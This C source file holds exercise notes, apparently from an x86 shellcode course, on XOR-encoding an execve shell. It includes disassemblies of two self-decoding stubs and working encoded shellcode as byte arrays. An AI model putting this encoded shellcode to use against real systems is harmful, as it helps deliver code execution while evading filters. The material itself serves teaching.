/*
Following video: Module 2-7: XOR
Using code from NASM\2-7

XOR Table:
|  A  |  B  |  A ^ B |
----------------------
|  0  |  0  |    0   |
|  1  |  1  |    0   |
|  1  |  0  |    1   |
|  0  |  1  |    1   |


; Shellcode with manual defined LOOP

    /mnt/git/NASM/SLAE32/2-7_XOR/execve-xor:     file format elf32-i386

    Disassembly of section .text:

    08049000 <_start>:
     8049000:       eb 0d                   jmp    804900f <call_decoder>

    08049002 <decoder>:
     8049002:       5e                      pop    esi
     8049003:       31 c9                   xor    ecx,ecx
     8049005:       b1 1e                   mov    cl,0x1e

    08049007 <decode>:
     8049007:       80 36 aa                xor    BYTE PTR [esi],0xaa
     804900a:       46                      inc    esi
     804900b:       e2 fa                   loop   8049007 <decode>
     804900d:       eb 05                   jmp    8049014 <Shellcode>

    0804900f <call_decoder>:
     804900f:       e8 ee ff ff ff          call   8049002 <decoder>

    08049014 <Shellcode>:
     8049014:       9b                      fwait
     8049015:       6a fa                   push   0xfffffffa
     8049017:       c2 c8 cb                ret    0xcbc8
     804901a:       d9 c2                   fld    st(2)
     804901c:       c2 c8 c3                ret    0xc3c8
     804901f:       c4 85 c2 85 85 85       les    eax,FWORD PTR [ebp-0x7a7a7a3e]
     8049025:       85 23                   test   DWORD PTR [ebx],esp
     8049027:       49                      dec    ecx
     8049028:       fa                      cli    
     8049029:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
     804902c:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
     804902f:       a1                      .byte 0xa1
     8049030:       67                      addr16
     8049031:       2a                      .byte 0x2a


; Shellcode with marker (NULL) defined loop via JZ

    /mnt/git/NASM/SLAE32/2-7_XOR/execve-xor-with-marker:     file format elf32-i386

    Disassembly of section .text:

    08049000 <_start>:
     8049000:       eb 0b                   jmp    804900d <call_decoder>

    08049002 <decoder>:
     8049002:       5e                      pop    esi

    08049003 <decode>:
     8049003:       80 36 aa                xor    BYTE PTR [esi],0xaa
     8049006:       74 0a                   je     8049012 <Shellcode>
     8049008:       46                      inc    esi
     8049009:       eb f8                   jmp    8049003 <decode>
     804900b:       eb 05                   jmp    8049012 <Shellcode>

    0804900d <call_decoder>:
     804900d:       e8 f0 ff ff ff          call   8049002 <decoder>

    08049012 <Shellcode>:
     8049012:       9b                      fwait
     8049013:       6a fa                   push   0xfffffffa
     8049015:       c2 c8 cb                ret    0xcbc8
     8049018:       d9 c2                   fld    st(2)
     804901a:       c2 c8 c3                ret    0xc3c8
     804901d:       c4 85 c2 85 85 85       les    eax,FWORD PTR [ebp-0x7a7a7a3e]
     8049023:       85 23                   test   DWORD PTR [ebx],esp
     8049025:       49                      dec    ecx
     8049026:       fa                      cli    
     8049027:       23 48 f9                and    ecx,DWORD PTR [eax-0x7]
     804902a:       23 4b 1a                and    ecx,DWORD PTR [ebx+0x1a]
     804902d:       a1                      .byte 0xa1
     804902e:       67                      addr16
     804902f:       2a                      .byte 0x2a
     8049030:       aa                      stos   BYTE PTR es:[edi],al

*/


// Manual defined LOOP shellcode
// unsigned char shellcode[] = {
// "\xeb\x0d\x5e\x31\xc9\xb1\x1e\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8"
// "\xee\xff\xff\xff\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4"
// "\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1"
// "\x67\x2a"
// };

unsigned char shellcode[] = {
"\xeb\x0b\x5e\x80\x36\xaa\x74\x0a\x46\xeb\xf8\xeb\x05\xe8\xf0\xff"
"\xff\xff\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2"
"\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
"\xaa"
};

unsigned int shellcode_len = sizeof(shellcode)-1;